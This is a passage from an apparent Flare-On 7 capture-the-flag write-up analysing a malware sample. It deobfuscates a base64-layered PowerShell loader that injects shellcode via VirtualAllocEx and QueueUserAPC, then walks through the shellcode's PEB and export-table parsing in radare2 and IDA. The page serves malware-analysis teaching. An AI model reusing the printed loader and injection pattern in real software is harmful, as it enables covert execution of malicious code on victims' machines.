+<span class="s2">&#34;Script&#34;</span><span class="o">=</span>str<span class="o">(</span>1<span class="o">)</span>:<span class="s2">&#34;C:\Windows\System32\forfiles.exe&#34;</span>
+</code></pre></div><p>As it is clear that there is a base64 encoding applied in the Powershell code, it will be a wise idea to clean it up a little bit. Overall, the structure of the script is as follows:</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$jjw</span> <span class="p">=</span> <span class="s2">&#34;kcsukccudy&#34;</span><span class="p">;</span>
+
+<span class="c"># Receives a base64 encoded string and returns it as decoded bytes</span>
+<span class="k">function</span> <span class="n">hjmk</span><span class="p">{</span>
+    <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="n">0</span><span class="p">]);</span>
+<span class="p">};</span>
+
+<span class="c"># Define a byte array from a base64 encoded blob</span>
+<span class="no">[byte[]]</span> <span class="nv">$rpl</span> <span class="p">=</span> <span class="n">hjmk</span><span class="p">(</span><span class="s2">&#34;6feZAAA0BgBuMWFe...[ a huge base64 blob ]...&#34;</span><span class="p">)</span>
+
+<span class="c"># Receives a base64 encoded string and returns it as ASCII string</span>
+<span class="k">function</span> <span class="n">geapmkxsiw</span> <span class="p">{</span>
+    <span class="nv">$kjurpkot</span> <span class="p">=</span> <span class="n">hjmk</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="n">0</span><span class="p">]);</span>
+    <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$kjurpkot</span><span class="p">);</span>
+<span class="p">};</span>
+
+<span class="c"># Calls Invoke-Expression to dynamically execute powershell code from a script</span>
+<span class="c"># The base64 encoded content will be decoded using the utility functions above</span>
+<span class="nb">iex </span><span class="p">(</span><span class="n">geapmkxsiw</span><span class="p">(</span><span class="s2">&#34;DQokY3FsdGQ...[base64 blob]...&#34;</span><span class="p">));</span>
+<span class="nb">iex </span><span class="p">(</span><span class="n">geapmkxsiw</span><span class="p">(</span><span class="s2">&#34;DQoNCiRqa3k...[base64 blob]...&#34;</span><span class="p">));</span>
+</code></pre></div><p>The logic of the first stage is very simple. We have three base64 encoded blobs embedded in the script. The first one is huge and used as a byte-array (rather than an ASCII string). This, in addition to the visible amount of null-bytes (encoded as <code>AAAA</code>), tells us that this is likely to be a binary code.</p>
+<p>The next two base64 encoded blobs are decoded and passed to <code>iex</code> (alias for <code>Invoke-Expression</code>). They are rather short and treated as ASCII. There is no doubt, they are another layer of Powershell code. The <code>$rpl</code> variable (the binary code) is not referenced in this layer, so it is likely to be used in the next one.</p>
+<p>There are many ways to decode the base64, starting from the 2nd layer. You can choose your favorite or follow one of our preferred options:</p>
+<ol>
+<li>
+<p>Replace <code>iex</code> with <code>Write-Host</code> - This is an easy and useful way to handle encoded or encrypted code in scripts of different kinds. We simply replace the execution commands with print commands. It works great for Powershell, Shell scripts, Javascript, VB Scripts, and others.</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Replace &#39;iex&#39; with &#39;Write-Host&#39;</span>
+<span class="nb">Write-Host</span> <span class="p">(</span><span class="n">geapmkxsiw</span><span class="p">(</span><span class="s2">&#34;DQokY3FsdGQ...[base64 blob]...&#34;</span><span class="p">));</span>
+<span class="nb">Write-Host</span> <span class="p">(</span><span class="n">geapmkxsiw</span><span class="p">(</span><span class="s2">&#34;DQoNCiRqa3k...[base64 blob]...&#34;</span><span class="p">));</span><span class="n">2</span><span class="p">.</span> 
+</code></pre></div></li>
+<li>
+<p>Use extensions from your IDE. This is how it looks like with Crypto Tools for VSCode.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/vscode_base64_decode.gif" title="/posts/flare-on-7-rabbithole/images/vscode_base64_decode.gif" data-thumbnail="/posts/flare-on-7-rabbithole/images/vscode_base64_decode.gif">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/vscode_base64_decode.gif"
+            data-srcset="/posts/flare-on-7-rabbithole/images/vscode_base64_decode.gif, images/vscode_base64_decode.gif 1.5x, /posts/flare-on-7-rabbithole/images/vscode_base64_decode.gif 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/vscode_base64_decode.gif" />
+    </a>
+</li>
+<li>
+<p>Other tools like <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64%28%27A-Za-z0-9%2B/%3D%27,true%29&amp;input=RFFva1kzRnNkR1E5SWcwS1cwUnNiRWx0Y0c5eWRDaGdJbXRsY201bGJETXlZQ0lwWFdCdWNIVmliR2xqSUhOMFlYUnBZeUJsZUhSbGNtNGdTVzUwVUhSeUlFZGxkRU4xY25KbGJuUlVhSEpsWVdSSlpDZ3BPMkJ1RFFwYlJHeHNTVzF3YjNKMEtHQWlhMlZ5Ym1Wc016SmdJaWxkWUc1d2RXSnNhV01nYzNSaGRHbGpJR1Y0ZEdWeWJpQkpiblJRZEhJZ1QzQmxibFJvY21WaFpDaDFhVzUwSUc1dmNHVjViR3hoZUN4MWFXNTBJR2wwY1hoc2RuQmpMRWx1ZEZCMGNpQjNaVzhwTzJCdURRcGJSR3hzU1cxd2IzSjBLR0FpYTJWeWJtVnNNekpnSWlsZFlHNXdkV0pzYVdNZ2MzUmhkR2xqSUdWNGRHVnliaUIxYVc1MElGRjFaWFZsVlhObGNrRlFReWhKYm5SUWRISWdiSGh4YVN4SmJuUlFkSElnY1d4eUxFbHVkRkIwY2lCMFoyOXRkMnBzWVNrN1lHNE5DbHRFYkd4SmJYQnZjblFvWUNKclpYSnVaV3d6TW1BaUtWMWdibkIxWW14cFl5QnpkR0YwYVdNZ1pYaDBaWEp1SUhadmFXUWdVMnhsWlhCRmVDaDFhVzUwSUhkdWFIUnBlV2QyWXl4MWFXNTBJR2xuZVhZcE95STdEUW9OQ2lSMGMyVnNZMlo0YUhkdlBVRmtaQzFVZVhCbElDMXRaVzFpWlhKRVpXWnBibWwwYVc5dUlDUmpjV3gwWkNBdFRtRnRaU0FuWVd4M0p5QXRibUZ0WlhOd1lXTmxJR1ZzZFdWa2RtVWdMWEJoYzNOMGFISjFPdzBLRFFva1pISjVhbTF1Y0hGcVBTSm1abU40SWpza2JtRjVkejBpRFFwYlJHeHNTVzF3YjNKMEtHQWlhMlZ5Ym1Wc016SmdJaWxkWUc1d2RXSnNhV01nYzNSaGRHbGpJR1Y0ZEdWeWJpQkpiblJRZEhJZ1IyVjBRM1Z5Y21WdWRGQnliMk5sYzNNb0tUdGdiZzBLVzBSc2JFbHRjRzl5ZENoZ0ltdGxjbTVsYkRNeVlDSXBYV0J1Y0hWaWJHbGpJSE4wWVhScFl5QmxlSFJsY200Z1NXNTBVSFJ5SUZacGNuUjFZV3hCYkd4dlkwVjRLRWx1ZEZCMGNpQjNZWE50YUhGbWVTeEpiblJRZEhJZ2FIUmtaM0ZvWjNCM1lXa3NkV2x1ZENCMWVHNHNkV2x1ZENCdFpYQm5ZM0JrWW5CakxIVnBiblFnZUdScWNDazdJanNOQ2cwS0pIbDNjWEJvYzNKM1BVRmtaQzFVZVhCbElDMXRaVzFpWlhKRVpXWnBibWwwYVc5dUlDUnVZWGwzSUMxT1lXMWxJQ2R3Y1c1MmIyaHNaMmRtSnlBdGJtRnRaWE53WVdObElISnRZaUF0Y0dGemMzUm9jblU3RFFvPQoKRFFvTkNpUnFhM2s5SW1Wd2JtTWlPdzBLRFFva2EzZG9hejBrZEhObGJHTm1lR2gzYnpvNlQzQmxibFJvY21WaFpDZ3hOaXd3TENSMGMyVnNZMlo0YUhkdk9qcEhaWFJEZFhKeVpXNTBWR2h5WldGa1NXUW9LU2s3RFFwcFppZ2tlV2hwWW1KeGR6MGtlWGR4Y0doemNuYzZPbFpwY25SMVlXeEJiR3h2WTBWNEtDUjVkM0Z3YUhOeWR6bzZSMlYwUTNWeWNtVnVkRkJ5YjJObGMzTW9LU3d3TENSeWNHd3VUR1Z1WjNSb0xERXlNamc0TERZMEtTa05DbnNOQ2lCYlUzbHpkR1Z0TGxKMWJuUnBiV1V1U1c1MFpYSnZjRk5sY25acFkyVnpMazFoY25Ob1lXeGRPanBEYjNCNUtDUnljR3dzTUN3a2VXaHBZbUp4ZHl3a2NuQnNMbXhsYm1kMGFDazdEUW9nYVdZb0pIUnpaV3hqWm5ob2QyODZPbEYxWlhWbFZYTmxja0ZRUXlna2VXaHBZbUp4ZHl3a2EzZG9heXdrZVdocFltSnhkeWtwRFFvZ2V3MEtJQ0FrZEhObGJHTm1lR2gzYnpvNlUyeGxaWEJGZUNnMUxETXBPdzBLSUgwTkNuME5Dbj09" target="_blank" rel="noopener noreffer">Cyber Chef</a>, <code>base64</code> utility for Linux, or simply Python</p>
+</li>
+</ol>
+<p>We have decoded the first layer, and now we can have a look at the readable Powershell code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Define a byte array from a base64 encoded blob</span>
+<span class="no">[byte[]]</span> <span class="nv">$rpl</span> <span class="p">=</span> <span class="n">hjmk</span><span class="p">(</span><span class="s2">&#34;6feZAAA0BgBuMWFe...[ a huge base64 blob ]...&#34;</span><span class="p">)</span>
+
+<span class="c"># Define type definitions for Windows API functions: GetCurrentProcess, VirtualAllocEx</span>
+<span class="nv">$nayw</span> <span class="p">=</span> <span class="s2">&#34;[DllImport(</span><span class="se">`&#34;</span><span class="s2">kernel32</span><span class="se">`&#34;</span><span class="s2">)]
+</span><span class="s2">public static extern IntPtr GetCurrentProcess();
+</span><span class="s2">[DllImport(</span><span class="se">`&#34;</span><span class="s2">kernel32</span><span class="se">`&#34;</span><span class="s2">)]
+</span><span class="s2">public static extern IntPtr VirtualAllocEx(IntPtr wasmhqfy,IntPtr htdgqhgpwai,uint uxn,uint mepgcpdbpc,uint xdjp);&#34;</span><span class="p">;</span>
+
+<span class="nv">$ywqphsrw</span> <span class="p">=</span> <span class="nb">Add-Type</span> <span class="n">-memberDefinition</span> <span class="nv">$nayw</span> <span class="n">-Name</span> <span class="s1">&#39;pqnvohlggf&#39;</span> <span class="n">-namespace</span> <span class="n">rmb</span> <span class="n">-passthru</span><span class="p">;</span>
+
+<span class="nv">$kwhk</span> <span class="p">=</span> <span class="nv">$tselcfxhwo</span><span class="p">::</span><span class="n">OpenThread</span><span class="p">(</span><span class="n">16</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$tselcfxhwo</span><span class="p">::</span><span class="n">GetCurrentThreadId</span><span class="p">());</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$yhibbqw</span><span class="p">=</span><span class="nv">$ywqphsrw</span><span class="p">::</span><span class="n">VirtualAllocEx</span><span class="p">(</span><span class="nv">$ywqphsrw</span><span class="p">::</span><span class="n">GetCurrentProcess</span><span class="p">(),</span><span class="n">0</span><span class="p">,</span><span class="nv">$rpl</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span><span class="n">12288</span><span class="p">,</span><span class="n">64</span><span class="p">))</span>
+<span class="p">{</span>
+    <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">Copy</span><span class="p">(</span><span class="nv">$rpl</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$yhibbqw</span><span class="p">,</span><span class="nv">$rpl</span><span class="p">.</span><span class="n">length</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$tselcfxhwo</span><span class="p">::</span><span class="n">QueueUserAPC</span><span class="p">(</span><span class="nv">$yhibbqw</span><span class="p">,</span><span class="nv">$kwhk</span><span class="p">,</span><span class="nv">$yhibbqw</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="nv">$tselcfxhwo</span><span class="p">::</span><span class="n">SleepEx</span><span class="p">(</span><span class="n">5</span><span class="p">,</span><span class="n">3</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>Looking at the decoded script, it is now much clearer what it is doing. After importing and defining Windows API functions, the Powershell script is allocating memory for the huge binary blob using <code>VirtualAllocEx</code>, copies the memory to it using <code>Copy</code>, and then uses Asynchronous Procedure Call (APC) to asynchronously run the binary code. By entering sleep, it enters an &ldquo;alertable&rdquo; state and the execution of the code is triggered.</p>
+<p>Simply put, the Powershell code is writing the binary code to the memory and executing it. We can now use base64 to decode the binary blob and save it to a file.</p>
+<h2 id="analyzing-the-shellcode">Analyzing the Shellcode</h2>
+<p>After dumping the shellcode to a file named <code>shellcode.bin</code> we can open it in a disassembler of our choice and inspect the code at offset 0x00, as this is the location from which the execution begins.</p>
+<p>The first instruction on our 64-bit binary is a <code>jmp</code> to <code>0x99fc</code>. It is common to see a shellcode begins with a jump.</p>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">$</span> <span class="no">r2</span> <span class="no">shellcode.bin</span>
+
+<span class="c"># Disassemble one instruction
+</span><span class="c"></span><span class="err">[0</span><span class="nf">x00000000</span><span class="p">]</span><span class="err">&gt;</span> <span class="no">pid</span> <span class="mi">1</span>
+<span class="err">0</span><span class="nf">x00000000</span>  <span class="no">jmp</span> <span class="mi">0x99fc</span>
+</code></pre></div><p>Let us navigate to <code>0x99fc</code> and inspect the instructions on this address.</p>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">[0</span><span class="nf">x000099fc</span><span class="p">]</span><span class="err">&gt;</span> <span class="no">pid</span> <span class="mi">30</span>
+
+<span class="err">0</span><span class="nf">x000099fc</span>  <span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rsp</span> <span class="err">+</span> <span class="mi">8</span><span class="p">],</span> <span class="no">rbx</span>
+<span class="err">0</span><span class="nf">x00009a01</span>  <span class="no">push</span> <span class="no">rbp</span>
+<span class="na">...</span>
+<span class="err">0</span><span class="nf">x00009a13</span>  <span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">gs</span><span class="p">:[</span><span class="mi">0x30</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00009a1c</span>  <span class="no">xor</span> <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
+<span class="err">0</span><span class="nf">x00009a1e</span>  <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rcx</span>
+<span class="err">0</span><span class="nf">x00009a21</span>  <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0x60</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00009a25</span>  <span class="no">xor</span> <span class="no">esi</span><span class="p">,</span> <span class="no">esi</span>
+<span class="err">0</span><span class="nf">x00009a27</span>  <span class="no">mov</span> <span class="no">r13</span><span class="p">,</span> <span class="mi">0xfffffffffffff000</span>
+<span class="err">0</span><span class="nf">x00009a2e</span>  <span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rdx</span> <span class="err">+</span> <span class="mi">0x18</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00009a32</span>  <span class="no">xor</span> <span class="no">r12d</span><span class="p">,</span> <span class="no">r12d</span>
+<span class="err">0</span><span class="nf">x00009a35</span>  <span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rsp</span> <span class="err">+</span> <span class="mi">0x108</span><span class="p">],</span> <span class="no">rbp</span>
+<span class="err">0</span><span class="nf">x00009a3d</span>  <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0x10</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00009a41</span>  <span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rsp</span> <span class="err">+</span> <span class="mi">0x110</span><span class="p">],</span> <span class="no">rsi</span>
+<span class="err">0</span><span class="nf">x00009a49</span>  <span class="no">lea</span> <span class="no">r14d</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="err">+</span> <span class="mi">1</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00009a4d</span>  <span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rdx</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00009a50</span>  <span class="no">mov</span> <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0x30</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00009a54</span>  <span class="no">and</span> <span class="no">rcx</span><span class="p">,</span> <span class="no">r13</span>
+<span class="err">0</span><span class="nf">x00009a57</span>  <span class="no">movsxd</span> <span class="no">rax</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">rcx</span> <span class="err">+</span> <span class="mi">0x3c</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00009a5b</span>  <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="no">rcx</span> <span class="err">+</span> <span class="mi">0x88</span><span class="p">]</span>
+<span class="na">...</span>
+</code></pre></div><p>If this pattern looks familiar to you, you are not alone. The shellcode is accessing its <a href="https://en.wikipedia.org/wiki/Win32_Thread_Information_Block" target="_blank" rel="noopener noreffer">Thread Environment Block</a> by reading <code>gs:[0x30]</code>, and then navigates through different structures and offsets in the headers of the process. The TEB contains information about the process&rsquo;s thread, including a pointer to another very important structure called <code>Process Environment Block</code> (PEB) where information about the process itself (image path, command-line arguments, loaded modules and similar) is stored. This looks like a typical loader. Ready for a quick journey inside the PE header? Let&rsquo;s go!</p>
+<p>Follow the comments in the code block below to see the different structures that are used by the shellcode.</p>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0</span><span class="nf">x00009a13</span>  <span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">gs</span><span class="p">:[</span><span class="mi">0x30</span><span class="p">]</span> <span class="c">; Access the TEB for 64-bit (TEB64)
+</span><span class="c"></span><span class="mi">0x00009a1c</span>  <span class="no">xor</span> <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
+<span class="err">0</span><span class="nf">x00009a1e</span>  <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rcx</span>
+<span class="err">0</span><span class="nf">x00009a21</span>  <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0x60</span><span class="p">]</span> <span class="c">; Access the PEB for 64-bit (PEB64 = TEB64 + 0x60)
+</span><span class="c"></span><span class="mi">0x00009a25</span>  <span class="no">xor</span> <span class="no">esi</span><span class="p">,</span> <span class="no">esi</span>
+<span class="err">0</span><span class="nf">x00009a27</span>  <span class="no">mov</span> <span class="no">r13</span><span class="p">,</span> <span class="mi">0xfffffffffffff000</span>
+
+<span class="c">; Access the Ldr structure that contains information about all of the loaded modules in the current process
+</span><span class="c"></span><span class="err">0</span><span class="nf">x00009a2e</span>  <span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rdx</span> <span class="err">+</span> <span class="mi">0x18</span><span class="p">]</span> <span class="c">; Ldr = PEB64 + 0x18
+</span><span class="c"></span><span class="mi">0x00009a32</span>  <span class="no">xor</span> <span class="no">r12d</span><span class="p">,</span> <span class="no">r12d</span>
+<span class="err">0</span><span class="nf">x00009a35</span>  <span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rsp</span> <span class="err">+</span> <span class="mi">0x108</span><span class="p">],</span> <span class="no">rbp</span>
+<span class="err">0</span><span class="nf">x00009a3d</span>  <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0x10</span><span class="p">]</span> <span class="c">; Access InMemoryOrderLinks for 64-bit
+</span><span class="c"></span><span class="mi">0x00009a41</span>  <span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rsp</span> <span class="err">+</span> <span class="mi">0x110</span><span class="p">],</span> <span class="no">rsi</span>
+<span class="err">0</span><span class="nf">x00009a49</span>  <span class="no">lea</span> <span class="no">r14d</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="err">+</span> <span class="mi">1</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00009a4d</span>  <span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rdx</span><span class="p">]</span> <span class="c">; Access the first loaded module (ntdll.dll)
+</span><span class="c"></span><span class="mi">0x00009a50</span>  <span class="no">mov</span> <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0x30</span><span class="p">]</span> <span class="c">; Reads Ntdll&#39;s base address
+</span></code></pre></div><p>Essentially, the shellcode parses its own header and navigates through the different structures until it reaches the base address of Ntdll. Let&rsquo;s continue and explore what it does now that it has access to Ntdll&rsquo;s base address.</p>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0</span><span class="nf">x00009a57</span>  <span class="no">movsxd</span> <span class="no">rax</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">rcx</span> <span class="err">+</span> <span class="mi">0x3c</span><span class="p">]</span> <span class="c">; Read the start offset of the PE header
+</span><span class="c"></span><span class="mi">0x00009a5b</span>  <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="no">rcx</span> <span class="err">+</span> <span class="mi">0x88</span><span class="p">]</span> <span class="c">; Access the Export Table (PE_Header64 + 0x88)
+</span><span class="c"></span><span class="no">...</span>
+<span class="err">0</span><span class="nf">x00009a6a</span>  <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rcx</span> <span class="err">+</span> <span class="no">rdx</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00009a6e</span>  <span class="no">mov</span> <span class="no">r12d</span><span class="p">,</span> <span class="no">r14d</span>
+<span class="err">0</span><span class="nf">x00009a71</span>  <span class="no">mov</span> <span class="no">r11d</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0x1c</span><span class="p">]</span> <span class="c">; AddressOfFunctions (Export Address Table RVA)
+</span><span class="c"></span><span class="mi">0x00009a75</span>  <span class="no">mov</span> <span class="no">r10d</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0x20</span><span class="p">]</span> <span class="c">; AddressOfNames (Name Pointer RVA)
+</span><span class="c"></span><span class="mi">0x00009a79</span>  <span class="no">mov</span> <span class="no">r8d</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0x24</span><span class="p">]</span> <span class="c">; AddressOfNameOrdinals (Ordinal Table RVA)
+</span><span class="c"></span><span class="mi">0x00009a7d</span>  <span class="no">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0x18</span><span class="p">]</span> <span class="c">; NumberOfNames (Number of Name Pointers)
+</span></code></pre></div><p>The shellcode is then navigating to the Export Table of ntdll.dll. Most likely, it will soon iterate through the export table in search of specific functions that will help it bootstrap the code.</p>
+<p>We open the shellcode in IDA as a 64-bit binary file and tell IDA to treat the data in offsets <code>0x00</code> and <code>0x000099fc</code> as code. We then define the code at <code>0x000099fc</code> as a function. It is highly recommended to use IDA&rsquo;s decompiler when dealing with code that accesses the PE header, as it will look much better.</p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>Info<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">If you don&rsquo;t have access to IDA or its decompiler, any other solution will do. We will only show it here as it is easier to understand some of the functionalities.</div>
+        </div>
+    </div>
+<p>This is the decompiled code that is equivalent to the disassembly we saw earlier:</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_4.png" title="/posts/flare-on-7-rabbithole/images/image_4.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_4.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_4.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_4.png, images/image_4.png 1.5x, /posts/flare-on-7-rabbithole/images/image_4.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_4.png" />
+    </a>
+<p>As it is very messy, we can use some tricks to clean it and have a very nice output. Starting from importing the relevant structures. Press <code>Ctrl+F11</code> or go to &ldquo;View -&gt; Open Subviews → Type libraries&rdquo; and press <code>Insert</code> to add a new type library. Search for &ldquo;ntapi&rdquo; and click &ldquo;OK&rdquo;. Then go back to the decompiler and press <code>F5</code> again.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_5.png" title="/posts/flare-on-7-rabbithole/images/image_5.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_5.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_5.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_5.png, images/image_5.png 1.5x, /posts/flare-on-7-rabbithole/images/image_5.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_5.png" />
+    </a>
+<p>Looks better, right? Let&rsquo;s improve it a little bit more and tell IDA that <code>v6</code> is pointing to the Export Table. Right-click on the variable and choose &ldquo;Convert to struct&rdquo;. Then, choose the &ldquo;IMAGE_EXPORT_DIRECTORY&rdquo; structure and press &ldquo;OK&rdquo;. We can now add some names and comments and have a great output that we can work with.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_6.png" title="/posts/flare-on-7-rabbithole/images/image_6.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_6.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_6.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_6.png, images/image_6.png 1.5x, /posts/flare-on-7-rabbithole/images/image_6.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_6.png" />
+    </a>
+<p>Having access to these values, the shellcode is now iterating over the exported functions and look for two specific ones: <code>LdrLoadDll</code> and <code>LdrGetProcedureAddress</code>.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_7.png" title="/posts/flare-on-7-rabbithole/images/image_7.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_7.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_7.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_7.png, images/image_7.png 1.5x, /posts/flare-on-7-rabbithole/images/image_7.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_7.png" />
+    </a>
+<p>The pointers to these exported functions are saved to two variables we named <code>ptrLdrGetProcedureAddress</code> and <code>ptrLdrLoadDll</code>. We can now expect to see these functions called. The problem is, that it is not easy to spot dynamic calls in IDA&rsquo;s decompiler view, especially in big and noisy functions, as the syntax highlighting lacks highlights for dynamic function calls (e.g calling a variable).</p>
+<p>This examples shows how hard it is to notice that <code>v31</code> is dynamically called:</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_8.png" title="/posts/flare-on-7-rabbithole/images/image_8.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_8.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_8.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_8.png, images/image_8.png 1.5x, /posts/flare-on-7-rabbithole/images/image_8.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_8.png" />
+    </a>
+<h3 id="highlighting-dynamic-calls-in-the-decompiler">Highlighting dynamic calls in the decompiler</h3>
+<p>To ease our work, we usually use this tiny script that highlights these calls for us.</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">FIDL.decompiler_utils</span> <span class="kn">as</span> <span class="nn">du</span>
+
+<span class="n">func</span> <span class="o">=</span> <span class="n">du</span><span class="o">.</span><span class="n">controlFlowinator</span><span class="p">(</span><span class="n">ea</span><span class="o">=</span><span class="mh">0x99FC</span><span class="p">,</span> <span class="n">fast</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">color</span> <span class="o">=</span> <span class="mh">0xfff7d6</span> <span class="c1"># Soft blue</span>
+
+<span class="c1"># Iterate through all the calls from this function</span>
+<span class="k">for</span> <span class="n">call</span> <span class="ow">in</span> <span class="n">func</span><span class="o">.</span><span class="n">calls</span><span class="p">:</span>
+    <span class="c1"># Make sure it is a valid function call </span>
+    <span class="k">if</span> <span class="n">call</span><span class="o">.</span><span class="n">ea</span> <span class="o">!=</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">:</span>
+        <span class="c1"># Color the line of the call</span>
